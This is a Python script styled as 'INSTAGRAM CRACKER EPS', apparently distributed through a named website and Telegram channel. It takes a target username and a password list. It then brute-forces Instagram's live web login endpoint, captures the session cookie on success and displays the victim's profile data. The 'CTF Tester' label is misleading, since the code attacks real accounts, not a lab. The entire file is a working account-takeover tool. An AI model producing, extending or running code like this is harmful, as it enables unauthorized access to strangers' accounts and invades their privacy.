#EPS
import requests
import time
import os
import sys
import json
import threading
from datetime import datetime
INSTAGRAM_LOGO = """
\033[95m
  ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ███╗   ███╗
  ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
  ██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██╔████╔██║
  ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
  ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
  WebSite: https://eps.ct.ws
  telegram chanel: @EPS_CHANEL
\033[0m
"""

class InstagramCTFTester:
    def __init__(self):
        self.session = requests.Session()
        self.found = False
        self.attempts = 0
        self.start_time = time.time()
        self.csrf_token = None
        self.session_id = None
        self.user_id = None
        self.login_url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
        self.user_info_url = "https://www.instagram.com/api/v1/users/web_profile_info/?username="
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'x-csrftoken': '',
            'x-ig-app-id': '936619743392459'
        }
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(INSTAGRAM_LOGO)
    def get_csrf_token(self):
        try:
            response = self.session.get('https://www.instagram.com/accounts/login/')
            self.csrf_token = response.cookies.get('csrftoken')
            self.headers['x-csrftoken'] = self.csrf_token
            return True
        except:
            return False
    def test_credentials(self, username, password):
        if self.found:
            return False
        self.attempts += 1
        try:
            login_time = int(time.time())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{login_time}:{password}"
            data = {
                'username': username,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            response = self.session.post(self.login_url, data=data, headers=self.headers, timeout=10)
            if response.status_code == 200:
                result = response.json()
                if result.get('authenticated'):
                    self.session_id = response.cookies.get('sessionid')
                    self.user_id = result.get('userId')
                    self.found = True
                    return True
                elif result.get('user', False):
                    pass
                elif result.get('message') == 'checkpoint_required':
                    pass
            self.update_display(username, password, False)
        except Exception as e:
            print(f"Error: {str(e)}")
        return False
    def get_user_info(self, username):
        try:
            headers = self.headers.copy()
            if self.session_id:
                headers['Cookie'] = f'sessionid={self.session_id}'
            response = self.session.get(f"{self.user_info_url}{username}", headers=headers)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return None
    def update_display(self, username, password, success):
        elapsed = time.time() - self.start_time
        self.clear_screen()
        print("\033[96m" + "╔══════════════════════════════════════════════════╗")
        print("║               INSTAGRAM CRACK               ║")
        print("╠══════════════════════════════════════════════════╣")
        print("║  Target: {:<36} ║".format(username))
        print("║  Attempts: {:<35} ║".format(self.attempts))
        print("║  Elapsed: {:<36} ║".format(time.strftime('%H:%M:%S', time.gmtime(elapsed))))
        print("║  Testing: {:<36} ║".format(password))
        print("║  Status: {:<37} ║".format("\033[92mSUCCESS\033[96m" if success else "\033[91mFAILED\033[96m"))
        print("╚══════════════════════════════════════════════════╝\033[0m")
        if success:
            print(f"\n\033[92m[+] Password found: {password}\033[0m")
    def display_result(self, username, password, success, user_info=None):
        self.clear_screen()
        print("\033[96m" + "╔══════════════════════════════════════════════════╗")
        print("║                 TESTING RESULT                 ║")
        print("╠══════════════════════════════════════════════════╣")
        print("║  Target: {:<36} ║".format(username))
        print("║  Attempts: {:<35} ║".format(self.attempts))
        print("║  Elapsed: {:<36} ║".format(time.strftime('%H:%M:%S', time.gmtime(time.time() - self.start_time))))
        print("║  Password: {:<36} ║".format(password if success else "Not Found"))
        print("║  Status: {:<37} ║".format("\033[92mCRACKED SUCCESSFULLY\033[96m" if success else "\033[91mFAILED\033[96m"))
        if success and user_info:
            profile = user_info.get('data', {}).get('user', {})
            print("╠══════════════════════════════════════════════════╣")
            print("║                  USER INFO                      ║")
            print("╠══════════════════════════════════════════════════╣")
            print("║  User ID: {:<36} ║".format(profile.get('id', 'N/A')))
            print("║  Full Name: {:<34} ║".format(profile.get('full_name', 'N/A')))
            print("║  Followers: {:<35} ║".format(str(profile.get('edge_followed_by', {}).get('count', 'N/A'))))
            print("║  Following: {:<35} ║".format(str(profile.get('edge_follow', {}).get('count', 'N/A'))))
            print("║  Posts: {:<39} ║".format(str(profile.get('edge_owner_to_timeline_media', {}).get('count', 'N/A'))))
            print("║  Private: {:<37} ║".format(str(profile.get('is_private', 'N/A'))))
        print("╚══════════════════════════════════════════════════╝\033[0m")
        if success:
            print(f"\n\033[92m[+] Password found: {password}\033[0m")
            print("\033[92m[+] Account successfully accessed!\033[0m")
        else:
            print("\033[91m[-] Password not found in the list\033[0m")
    def run_test(self, username, password_list):
        self.clear_screen()
        print("\033[96m[*] Initializing Instagram CTF Tester...\033[0m")
        if not self.get_csrf_token():
            print("\033[91m[-] Failed to get CSRF token\033[0m")
            return
        print("\033[92m[+] CSRF token obtained successfully\033[0m")
        time.sleep(1)
        print("\033[96m[*] Starting credential testing...\033[0m")
        time.sleep(2)
        found_password = None
        for password in password_list:
            password = password.strip()
            if not password:
                continue
            if self.test_credentials(username, password):
                found_password = password
                break
            time.sleep(0.5)
        user_info = None
        if found_password:
            user_info = self.get_user_info(username)
        self.display_result(username, found_password, bool(found_password), user_info)
def main():
    tester = InstagramCTFTester()
    tester.clear_screen()
    print("\033[96m" + "╔══════════════════════════════════════════════════╗")
    print("║           INSTAGRAM CRACKER EPS                  ║")
    print("║           (EPS MALEK)                            ║")
    print("╚══════════════════════════════════════════════════╝\033[0m")
    username = input("\n\033[93m[💀] Enter target username: \033[0m")
    password_file = input("\033[93m[💀👉] Enter path to password list: \033[0m")
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.readlines()
        if not passwords:
            print("\033[91m[-] No passwords found in the file\033[0m")
            return
        print(f"\033[92m[+] Loaded {len(passwords)} passwords\033[0m")
        time.sleep(2)
        tester.run_test(username, passwords)
    except FileNotFoundError:
        print("\033[91m[-] Password file not found\033[0m")
    except Exception as e:
        print(f"\033[91m[-] Error: {str(e)}\033[0m")

if __name__ == "__main__":
    main()
